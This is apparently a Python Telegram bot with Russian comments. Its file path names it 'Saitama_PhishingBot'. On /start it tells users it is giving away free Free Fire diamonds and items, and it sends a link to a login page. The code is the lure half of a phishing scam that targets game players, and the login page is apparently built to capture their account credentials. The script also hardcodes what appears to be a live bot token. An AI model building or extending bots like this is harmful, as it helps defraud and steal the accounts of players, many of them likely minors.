from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Токен твоего бота
BOT_TOKEN = '7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0'

# ID главного админа (это ты)
MAIN_ADMIN_ID = 7947290290

# Ссылка на сайт
WEBSITE_URL = "file:///C:/Users/Syimykbek/Desktop/Saitama_PhishingBot/login.html"  # Замени на свой URL

# Обработчик команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await update.message.reply_text(
        "🎮 *Добро пожаловать!*\n\n"
        "Мы занимаемся раздачей алмазов и вещей в Free Fire. "
        "Перейдите по ссылке ниже, чтобы получить подарок:\n\n"
        f"{WEBSITE_URL}",
        parse_mode="Markdown"
    )

# Основная функция
def main():
    # Создаем приложение бота
    application = Application.builder().token(BOT_TOKEN).build()

    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start))

    # Запускаем бота
    application.run_polling()

if __name__ == "__main__":
    main()